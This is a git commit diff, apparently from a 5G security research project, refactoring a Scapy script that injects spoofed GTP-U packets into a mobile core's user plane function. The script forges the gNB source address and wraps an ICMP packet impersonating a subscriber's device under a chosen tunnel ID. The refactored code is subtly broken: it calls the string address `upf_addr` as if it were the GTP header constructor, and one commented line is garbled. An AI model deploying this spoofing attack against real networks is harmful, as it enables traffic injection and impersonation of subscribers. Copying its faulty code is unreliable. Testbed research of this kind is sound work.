ae83e040e76ab308611026a99460d73f0ee54058
thoger <thomas.hoger@laas.fr>
2025-05-07 15:30:21 +0200

    Refactor GTP-U packet construction for clarity and consistency

--- src/attacks/upf_gtp/test.py
+++ src/attacks/upf_gtp/test.py
@@ -6,55 +6,59 @@ from utils.logger import Log
 from scapy.all import arping, get_if_list
 import random
 
-def new_seq(rand = False):
+
+def new_seq(rand=False):
     return random.randint(0, 0xFFFF)
 
 
+TEID = int(sys.argv[1], 0)
+SRC_ADDR = "10.100.200.66"
+DST_ADDR = sys.argv[3]
+UE_ADDR = sys.argv[2]
+GNB_ADDR = "10.100.200.14"
+UPF_ADDR = "10.100.200.2"
+DPORT = 2152
+
+print(f"[i]  Interfaces: {get_if_list()}")
 
 
-logger = Log("[GTP-U]")
-
-teid = int(sys.argv[1], 0)
-src_ip = "10.100.200.66"
-spoofed_ip = sys.argv[3]
-ue_ip = sys.argv[2]
-gnb_addr = "10.100.200.14"
-upf_ip = "10.100.200.2"
-dport = 2152
-
-logger.info(f"Interfaces: {get_if_list()}")
+arping(UPF_ADDR)
 
 
+# ip_payload = IP(src=dst_addr, dst=ue_addr) / ICMP(type=8, id=0x1234, seq=new_seq(True)) / b"ABCDEFGHIJKLMNOPQRSTUVWX"
 
-arping(upf_ip)
+# gtpu_header = GTP_U_Header(teid=teid) upf_addrip_payload
 
+# packet = IP(src=upf_addr, dst=gnb_addr) / UDP(dport=dport, sport=RandShort()) / gtpu_header
 
-
-# ip_payload = IP(src=spoofed_ip, dst=ue_ip) / ICMP(type=8, id=0x1234, seq=new_seq(True)) / b"ABCDEFGHIJKLMNOPQRSTUVWX"
-
-# gtpu_header = GTP_U_Header(teid=teid) / ip_payload
-
-# packet = IP(src=upf_ip, dst=gnb_addr) / UDP(dport=dport, sport=RandShort()) / gtpu_header
-
-# logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_ip} through the upf ({upf_ip})")
-
+# logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_addr} through the upf ({upf_addr})")
 
 # send(packet)
 
 # logger.success("Packet sent successfully")
 
 
+def start_gtp_uplink_attack(
+    gnb_addr, upf_addr, teid, ue_addr, dst_addr, upf_dport=2152
+):
 
+    ip_payload = (
+        IP(src=ue_addr, dst=dst_addr)
+        / ICMP(type=8, id=0x1234, seq=new_seq(True))
+        / b"ABCDEFGHIJKLMNOPQRSTUVWX"
+    )
 
-ip_payload = IP(src=ue_ip, dst=spoofed_ip) / ICMP(type=8, id=0x1234, seq=new_seq(True)) / b"ABCDEFGHIJKLMNOPQRSTUVWX"
+    gtpu_header = upf_addr(teid=teid) / ip_payload
 
-gtpu_header = GTP_U_Header(teid=teid) / ip_payload
+    packet = (
+        IP(src=gnb_addr, dst=upf_addr)
+        / UDP(dport=upf_dport, sport=upf_dport)
+        / gtpu_header
+    )
 
-packet = IP(src=gnb_addr, dst=upf_ip) / UDP(dport=dport, sport=dport) / gtpu_header
+    print(
+        f"[i]  Sending GTP-U packet to {dst_addr} through UPF ({upf_addr}), TEID {teid}, spoofing UE {ue_addr}, source IP {gnb_addr}"
+    )
 
-logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_ip} through the upf ({upf_ip})")
-
-
-send(packet)
-
-logger.success("Packet sent successfully")
+    send(packet)
+    print("[+]  Packet sent successfully")
